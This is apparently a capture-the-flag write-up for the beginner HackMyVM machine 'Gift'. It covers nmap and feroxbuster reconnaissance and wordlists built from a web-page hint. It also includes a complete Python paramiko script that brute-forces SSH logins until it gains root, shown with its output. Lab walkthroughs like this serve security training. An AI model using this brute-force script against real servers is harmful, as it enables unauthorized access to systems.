# Gift

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Gift | sml | Beginner | HackMyVM |

**Summary:** Gift is a straightforward Linux machine that emphasizes the importance of not overthinking security challenges. The attack path involves discovering a cryptic hint on a web page, creating custom wordlists based on the hint, and successfully brute-forcing SSH credentials to gain direct root access.

---

## Reconnaissance

### Network Discovery

The initial network scan identified a single target machine on the local network:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.31 08:00:27:4A:2A:FB VirtualBox
```

The scan revealed `192.168.100.31` as our target, running in VirtualBox.

### Port Enumeration

A comprehensive port scan revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.31
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 15:34 WIB
Nmap scan report for 192.168.100.31
Host is up (0.0061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
```

**Key Findings:**
- **Port 22/tcp**: OpenSSH 8.3 running
- **Port 80/tcp**: nginx web server with no title

### Web Application Analysis

#### Directory Enumeration

Using feroxbuster to discover web content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.31/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,bak,zip,gif -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.31/
 🚩  In-Scope Url          │ 192.168.100.31
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip, gif]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        4l        9w       57c http://192.168.100.31/
200      GET        4l        9w       57c http://192.168.100.31/index.html
...
```

The scan only revealed the standard `index.html` file. No additional directories or files were discovered.

#### Web Content Analysis

Examining the web page content revealed a cryptic message:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i 192.168.100.31/index.html
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 25 Jan 2026 09:03:36 GMT
Content-Type: text/html
Content-Length: 57
Last-Modified: Sun, 20 Sep 2020 16:29:39 GMT
Connection: keep-alive
ETag: "5f678373-39"
Accept-Ranges: bytes


Dont Overthink. Really, Its simple.
        <!-- Trust me -->
```

**Critical Discovery:** The web page contains a hidden hint in the HTML comment: "Trust me" along with the main message "Dont Overthink. Really, Its simple."

---

## Initial Access

### Wordlist Generation Strategy

Based on the hint discovered on the web page, I developed a Python script to generate targeted wordlists:

```python
import itertools

hint = "Dont Overthink. Really, Its simple. Trust me"
words = [w.strip(".,<>!-").lower() for w in hint.replace("", "").split()]
words = list(set(words))

variations = words + [w.capitalize() for w in words]

with open("users.txt", "w") as f:
    for w in variations:
        f.write(f"{w}\n")
    f.write("admin\nroot\n")

with open("pass.txt", "w") as f:
    for w in variations:
        f.write(f"{w}\n")
        f.write(f"{w}123\n")
    f.write("trustme\ndontoverthink\nreallysimple\nsecret\n")

print("[+] Wordlists created: users.txt and pass.txt")
```

**Strategy Rationale:**
1. Extract individual words from the hint
2. Create variations (lowercase/capitalized)
3. Add common variations with "123" suffix
4. Include concatenated phrases like "trustme", "dontoverthink", "reallysimple"
5. Add standard usernames: admin, root

### Generated Wordlists

**Users:**
```
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gift]
└─$ cat users.txt
really
simple
overthink
me
trust
dont
its
Really
Simple
Overthink
Me
Trust
Dont
Its
admin
root
```

**Passwords:**
```
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gift]
└─$ cat pass.txt
really
really123
simple
simple123
overthink
overthink123
me
me123
trust
trust123
dont
dont123
its
its123
Really
Really123
Simple
Simple123
Overthink
Overthink123
Me
Me123
Trust
Trust123
Dont
Dont123
Its
Its123
trustme
dontoverthink
reallysimple
secret
```

### SSH Brute Force Attack

I developed a custom Python script using paramiko for SSH brute force:

```python
import paramiko
import socket
import os

target = "192.168.100.31"
port = 22

def ssh_brute(user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"[*] Testing {user}:{password}")
        client.connect(target, port=port, username=user, password=password, timeout=2)
        print(f"\n[!] SUCCESS: Username: {user} | Password: {password}\n")
        return True
    except paramiko.AuthenticationException:
        return False
    except socket.timeout:
        print("[!] Connection Timeout.")
        return False
    except Exception as e:
        return False
    finally:
        client.close()

def main():
    if not os.path.exists("users.txt") or not os.path.exists("pass.txt"):
        print("[!] File users.txt atau pass.txt tidak ditemukan!")
        return

    with open("users.txt", "r") as u_file:
        users = [line.strip() for line in u_file if line.strip()]

    with open("pass.txt", "r") as p_file:
        passwords = [line.strip() for line in p_file if line.strip()]

    print(f"[*] Starting brute-force on {target}...")
    print(f"[*] Total combinations: {len(users) * len(passwords)}")

    for u in users:
        for p in passwords:
            if ssh_brute(u, p):
                print("[+] Access Granted. Exiting...")
                return

if __name__ == "__main__":
    main()
```

### Successful Credential Discovery

The brute force attack was successful after testing approximately 512 combinations:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gift]
└─$ python3 ssh_attack.py
[*] Starting brute-force on 192.168.100.31...
[*] Total combinations: 512
[*] Testing really:really
[*] Testing really:really123
...
[*] Testing root:[REDACTED]

[!] SUCCESS: Username: root | Password: [REDACTED]

[+] Access Granted. Exiting...
```

**Critical Success:** `root:[REDACTED]` - Direct root access achieved!

### Root Access Confirmation

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gift]
└─$ ssh root@192.168.100.31
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@192.168.100.31's password: 
IM AN SSH SERVER
gift:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**Achievement:** Direct root access obtained without requiring privilege escalation.

---

## Flag Acquisition

Both user and root flags were immediately accessible from the root directory:

```bash
gift:~# ls
root.txt  user.txt
gift:~# cat root.txt
[REDACTED]
gift:~# cat user.txt
[REDACTED]
```

---

## Attack Chain Summary

1. **Network Reconnaissance**: Identified target machine `192.168.100.31` running VirtualBox
2. **Service Discovery**: Found SSH (port 22) and HTTP (port 80) services via nmap scan
3. **Web Analysis**: Discovered cryptic hint "Dont Overthink. Really, Its simple. Trust me" on index.html
4. **Intelligence Gathering**: Extracted keywords from the hint to build targeted attack wordlists
5. **Wordlist Generation**: Created custom username/password lists based on the discovered hint
6. **SSH Brute Force**: Executed systematic brute force attack against SSH service using custom wordlists
7. **Initial Access**: Successfully authenticated as `root` user with password.